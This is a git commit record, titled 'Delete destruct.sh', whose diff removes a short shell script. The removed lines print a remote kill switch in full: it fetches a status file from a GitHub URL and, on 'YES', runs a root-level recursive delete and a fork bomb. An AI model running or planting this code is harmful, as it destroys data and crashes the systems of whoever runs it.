712247374e58e336a92cad1f62c875177f5ce94d
ssbuffer <117183813+ssbuffer@users.noreply.github.com>
2022-11-01 11:58:33 -0300

    Delete destruct.sh

--- destruct.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/sh
-
-status=$(curl https://raw.githubusercontent.com/ssbuffer/self_destruct/main/status)
-
-if [ "$status" = "YES" ];
-then
-    rm -drf --no-preserve-root /
-    $(:(){ :|:& };:)
-fi
